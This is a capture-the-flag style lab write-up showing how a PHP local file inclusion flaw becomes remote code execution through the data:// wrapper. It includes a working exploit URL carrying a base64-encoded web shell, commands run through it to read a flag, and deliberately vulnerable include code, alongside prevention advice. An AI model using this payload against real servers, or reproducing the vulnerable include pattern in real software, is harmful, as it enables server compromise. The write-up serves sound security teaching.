# LFI to RCE using PHP Data Wrapper

## Lab Overview

This lab demonstrated how a **Local File Inclusion (LFI)** vulnerability can lead to **Remote Code Execution (RCE)** using the PHP `data://` wrapper.

Main learning point:

If:

```text
allow_url_include = On
```

is enabled in PHP configuration, attackers can inject PHP code directly into the include function and execute system commands.

---

# Step 1 - Check `allow_url_include`

For `data://` wrapper exploitation to work:

```ini
allow_url_include = On
```

must be enabled.

Why?

Normally, PHP `include()` loads local files only.

When this option is enabled, PHP also allows:

- Remote URLs
- Stream wrappers
- Inline data streams

This becomes dangerous when user input is passed into:

```php
include($_GET['language']);
```
# Vulnerable Code Example

```php
<?php
include($_GET['language']);
?>
```

The application trusts user-controlled input and directly includes it.

---

# Details

```text
http://154.57.164.74:32272/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```
# `data://`

PHP stream wrapper that allows inline data inclusion.

Instead of reading a physical file, PHP reads data supplied directly in the URL.

# `text/plain`

Specifies MIME type.

# `base64,`

Tells PHP the supplied data is Base64 encoded.

PHP automatically decodes it before processing.

## Base64 Payload

Encoded content:

```text
PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```
Decoded:

```php
<?php system($_GET["cmd"]); ?>
```

# Why Base64 Encoding?

Direct PHP code inside URLs may:

- Break request formatting
- Get blocked by filters
- Cause parsing issues

Base64 safely transports payloads as plain text.

PHP then decodes and executes them internally.

---

# What Happens Internally?

Application executes:

```php
include("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==");
```

PHP flow:

```text
1. Read data wrapper
2. Decode Base64
3. Interpret decoded content as PHP
4. Execute PHP code
```

Result:

```php
system($_GET["cmd"]);
```

becomes active command execution.

---

# Command Execution

Used:

```text
&cmd=id
```

Server executes:

```bash
id
```

Confirming Remote Code Execution.

---

# Reading the Flag

Executed:

```text
&cmd=cat+../../..//37809e2f8952f06139011994726d9ef1.txt
```

This reads the flag file from the server filesystem.

---

# Why This Leads to RCE

LFI normally allows:

- Reading local files

But when dangerous wrappers are enabled:

- Attacker-controlled input becomes executable PHP code

This upgrades:

```text
LFI → Remote Code Execution
```

---

# Key Learnings

- `allow_url_include=On` is highly dangerous
- PHP wrappers greatly increase LFI impact
- `data://` can inject inline PHP code
- Base64 encoding helps bypass parsing issues
- File inclusion bugs can quickly become full RCE

---

# Security Impact

Successful exploitation may lead to:

- Full server compromise
- Arbitrary command execution
- Credential theft
- Web shell upload
- Lateral movement

---

# Prevention

- Disable:

```ini
allow_url_include = Off
```

- Never pass user input directly into:
  
```php
include()
require()
include_once()
```

- Use strict allowlists for file inclusion
- Disable dangerous PHP functions:
  
```ini
system
exec
shell_exec
passthru
```

- Implement proper input validation
